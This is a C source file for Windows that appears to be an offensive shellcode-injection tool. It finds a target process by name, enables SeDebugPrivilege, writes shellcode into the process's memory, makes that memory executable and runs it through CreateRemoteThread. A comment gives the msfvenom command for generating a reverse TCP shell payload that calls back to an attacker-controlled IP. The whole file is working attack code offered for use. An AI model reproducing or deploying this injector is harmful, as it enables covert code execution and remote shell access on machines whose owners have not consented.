#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

/*------[REVERSE SHELL SHELLCODE AND ITS LENGTH]------*/
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00";
// You shellcode here: 
/* 
    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<tun0-IP> LPORT=7777 -f c
*/

size_t shellcodeLen = sizeof(shellcode);

/*------[THIS FUNCTION RETURNS THE PID OF A RUNNING PROCESS]------*/

int findTargetProc(const char *procname) {
    PROCESSENTRY32 pe32;
    int pid = 0;

    // Take a snapshot of all running processes:
    HANDLE hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // Quit the program if the process snapshot failed.
    if (hProcSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // Get the size of the snapshot:
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process in the snapshot
    if (!Process32First(hProcSnapshot, &pe32)) {
        CloseHandle(hProcSnapshot);
        return 0;
    }

    // Iterate through all the process in the snapshot. We break out from the loop as soon as we find the PID of the target process.
    while (Process32Next(hProcSnapshot, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnapshot);
    return pid;
}

int main(int argc, char *argv[]) {

    if(argc != 2){
        printf("\n[-] Usage: %s <Process Name>\n", argv[0]);
        return EXIT_FAILURE;
    }

    /*------[DECLARED VARIABLES]------*/
    DWORD PID;
    DWORD TID;
    HANDLE hProcess;
    HANDLE hThread;
    HANDLE hToken;
    LPVOID ExecMem;
    BOOL retWPM;
    BOOL retVP;
    DWORD oldProtect = 0;
    TOKEN_PRIVILEGES tokenPrivileges;

    /*------[GET PID OF TARGET PROCESS]------*/
    PID = findTargetProc(argv[1]);
    if (PID == 0) {
        printf("\n[-] Could not find the provided process '%s'\n", argv[1]);
        return EXIT_FAILURE;
    }

    printf("\n[*] The target process is %s (PID: %ld)\n", argv[1], PID);

    /*------[OPEN ACCESS TOKEN OF THE CURRENT PROCESS]------*/
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("\n[-] Could not open the access token associated with the current process - ERROR CODE: %ld\n", GetLastError()); 
        goto CLEANUP;
    }

    /*------[LOOKUP THE PRIVILEGE VALUE FOR SEDEBUG PRIVILEGE]------*/
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid)) {
        printf("\n[-] Could not lookup the privilege value for SeDebug token - ERROR CODE: %ld\n", GetLastError());
        goto CLEANUP;
    }

    /*------[SET SEDEBUGPRIVILEGE STATE TO ENABLE]------*/
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    /*------[ENABLE SEDEBUGPRIVILEGE]------*/
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL)) {
        printf("\n[-] Could not enable the SeDebugPrivilege token - ERROR CODE: %ld\n", GetLastError());
        goto CLEANUP;
    }

    /*------[OPEN THE TARGET PROCESS]------*/
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        printf("\n[-] Could not open the process %s (PID: %lx) - ERROR CODE: %ld\n", argv[1], PID, GetLastError());
        goto CLEANUP;
    }

    /*------[ALLOCATE BUFFER IN MEMORY ADDRESS SPACE OF THE PROCESS]------*/
    ExecMem = VirtualAllocEx(hProcess, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (ExecMem == NULL) {
        printf("\n[-] Could not allocate a buffer in the memory address space of the process %s (PID: %ld) - ERROR CODE: %lx\n", argv[1], PID, GetLastError());
        goto CLEANUP;
    }

    printf("[+] The base address of the allocated buffer is 0x%p\n", ExecMem);

    /*------[WRITING SHELLCODE IN THE ALLOCATED BUFFER]------*/
    printf("[*] Writing shellcode in the allocated buffer at 0x%p ...\n", ExecMem);
    retWPM = WriteProcessMemory(hProcess, ExecMem, shellcode, shellcodeLen, NULL);
    if (retWPM == 0) {
        printf("\n[-] Could not write shellcode in the allocated buffer - ERROR CODE: %lx\n", GetLastError());
        goto CLEANUP;
    }

    /*------[CHANGING MEMORY PROTECTIONS]------*/
    retVP = VirtualProtectEx(hProcess, ExecMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
    if (retVP == 0) {
        printf("\n[-] Could not change proctections of the memory - ERROR CODE: %lx\n", GetLastError());
        goto CLEANUP;
    }

    /*------[CREATING A THREAD THAT WILL EXECUTE OUR SHELLCODE]------*/
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ExecMem, 0, 0, &TID);
    if (hThread == NULL) {
        printf("\n[-] Could not create a thread on the process %s (PID: %ld) - ERROR CODE: %lx\n", argv[1], PID, GetLastError());
        goto CLEANUP;
    }

    printf("[*] Waiting for the newly created thread (TID: %ld) to finish the execution ...\n", TID);
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread finished the execution.\n");
    goto CLEANUP;

CLEANUP:

    printf("\n[*] Cleaning up ...\n");
	if (hThread) {
		printf("[*] Closing handle to thread\n");
		CloseHandle(hThread);
	}

	if (hProcess) {
		printf("[*] Closing handle to process\n");
		CloseHandle(hProcess);
	}

    if (hToken) {
        printf("[*] Closing handle to token\n");
        CloseHandle(hToken);
    }

    printf("\n[*] Quitting ...\n");


	return EXIT_SUCCESS;
}
